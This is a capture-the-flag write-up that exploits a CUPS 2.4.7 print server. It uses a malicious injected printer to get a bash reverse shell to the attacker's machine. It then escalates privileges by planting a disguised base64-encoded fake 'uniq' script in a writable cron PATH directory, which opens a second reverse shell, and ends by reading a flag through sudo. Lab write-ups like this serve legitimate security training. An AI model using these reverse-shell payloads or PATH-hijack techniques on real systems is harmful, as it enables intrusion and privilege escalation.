#  Print server (3 points)

Hi, emergency troubleshooter,

we've received a notification from the national CSIRT that the print server
`ipp.powergrid.tcc` may contain a vulnerability. Verify this report and
determine whether the vulnerability is present and how severe it is.

Stay grounded!

## Solution

The task suggests we are dealing with a print server, so we can try using a
standard port `631` directly, but it does not hurt to scan.

```
$ nmap -p- ipp.powergrid.tcc
Starting Nmap 7.95 ( https://nmap.org )
Nmap scan report for ipp.powergrid.tcc (10.99.25.20)
Host is up (0.010s latency).
Other addresses for ipp.powergrid.tcc (not scanned): 2001:db8:7cc::25:20
Not shown: 65534 closed tcp ports (reset)
PORT    STATE SERVICE
631/tcp open  ipp
```

There really is a print server running on that port, including a web UI, which
reveals we're dealing with OpenPrinting CUPS 2.4.7. This version contains
multiple vulnerabilities, so we can follow [this writeup][htb] almost to the
letter.

We do not need to bother with `/admin` access, as the vulnerabilities allow us
to inject a malicious printer without these permissions.

If we open a port on our machine (e.g. `nc -l -p 4444`) we can just download
[evil-cups] script and use it to add a malicious printer to our server.

_Note: The `10.200.0.15` address used in these scripts is the IP of the machine
from which the attack is being performed, i.e. it should be your IP._

```
$ python3 evilcups.py 10.200.0.15 ipp.powergrid.tcc 'nohup bash -c "bash -i >& /dev/tcp/10.200.0.15/4444 0>&1"&'
IPP Server Listening on ('10.200.0.15', 12345)
Sending udp packet to ipp.powergrid.tcc:631...
Please wait this normally takes 30 seconds...
0 elapsed
target connected, sending payload ...
```

With that in place, the printer should appear in the web UI in the `Printers`
section, and we can invoke `Maintenance -> Print test page` on it. The moment
this is executed, we should see a connection on our open port.

```
$ nc -l -p 4444
bash: cannot set terminal process group (135): Inappropriate ioctl for device
bash: no job control in this shell
lp@2d6ebafe1585:/$
```

We managed to get a shell of `lp` user, however, it is not enough to get the
flag. If we explore the system for a while, we come across `cron` jobs that
are scheduled.

```
lp@2d6ebafe1585:/$ cat /etc/cron.d/*
cat /etc/cron.d/*
*/5 * * * * root /root/reset/restore.sh > /var/log/restore.log 2>&1
30 3 * * 0 root test -e /run/systemd/system || SERVICE_MODE=1 /usr/lib/x86_64-linux-gnu/e2fsprogs/e2scrub_all_cron
10 3 * * * root test -e /run/systemd/system || SERVICE_MODE=1 /sbin/e2scrub_all -A -r
* * * * * cups_admin PATH=/opt/scripts:/usr/bin:/bin /usr/bin/python3 /opt/secure-scripts/statistics.py -n /opt/scripts/print_count.sh > /var/log/cron.log 2>&1
```

The last one (running most frequently as `cups_admin` user) seems to run some
statistics script. While we cannot see the content of `/opt/secure-scripts`,
we can see what `/opt/scripts/print_count.sh` does (and assume that the other
script is just some wrapper/launcher).

```
lp@2d6ebafe1585:/$ cat /opt/scripts/print_count.sh
#!/bin/bash

log="/var/log/cups/access_log"
output="/tmp/stats.txt"

grep 'POST /printers/.*HTTP/1\.1" 200' "$log" | awk '{ print $4, $7 }' | while read -r datetime path; do
    date=$(echo "$datetime" | cut -d: -f1 | tr -d '[')
    printer=$(echo "$path" | cut -d'/' -f3)
    echo "$date $printer"
done | sort | uniq -c | sort -nr > "$output"
```

In the crontab, we can also notice that it uses `PATH=/opt/scripts:/usr/bin:/bin`
i.e. it first looks in `/opt/scripts` when resolving commands to execute. As
it happens, this directory has `w` permission for `others`, i.e. we can write
anything there.

Let's prepare a "replacement `uniq`" script that opens another remote shell
against our machine (on yet another port that we open, e.g. `nc -l -p 4445`),
this time as `cups_admin`. To mask it, we can even make it call real `uniq` at
the end so that we don't break the statistics. It can look e.g. like this:

```
#!/bin/bash

nohup bash -c "bash -i >& /dev/tcp/10.200.0.15/4445 0>&1"
/usr/bin/uniq $*
```

For easier transfer to the server we can base64-encode it, and then just run
the following command in our `lp` shell. We should not forget to make it
executable after creating it.

```
lp@2d6ebafe1585:/opt/scripts$ echo IyEvYmluL2Jhc2gKCm5vaHVwIGJhc2ggLWMgImJhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMjAwLjAuMTUvNDQ0NSAwPiYxIgovdXNyL2Jpbi91bmlxICQqCg== | base64 -d > /opt/scripts/uniq
lp@2d6ebafe1585:/opt/scripts$ chmod a+rx uniq
lp@2d6ebafe1585:/opt/scripts$
```

Soon we should get another shell on our new port, this time as `cups_admin`.

```
$ nc -l -p 4445
bash: cannot set terminal process group (1138): Inappropriate ioctl for device
bash: no job control in this shell
cups_admin@2d6ebafe1585:~$
```

At this point we should delete our malicious `uniq` script (not to give hints
to other players and also to allow the players to inject their scripts).

Exploring the server as `cups_admin` does not yield any interesting new files,
however if we check whether we are allowed to run any even more privileged
commands using `sudo -l`, we discover that this user has a special permission
to print the `/root/TODO.txt` file.

```
cups_admin@2d6ebafe1585:~$ sudo -l
Matching Defaults entries for cups_admin on 2d6ebafe1585:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User cups_admin may run the following commands on 2d6ebafe1585:
    (ALL) NOPASSWD: /bin/cat /root/TODO.txt
```

Executing that command yields the flag:

```
cups_admin@2d6ebafe1585:~$ sudo cat /root/TODO.txt
FLAG{HqW1-cHIN-6S8U-w5uQ}
```

[evil-cups]: https://github.com/ippsec/evil-cups
[htb]: https://0xdf.gitlab.io/2024/10/02/htb-evilcups.html#
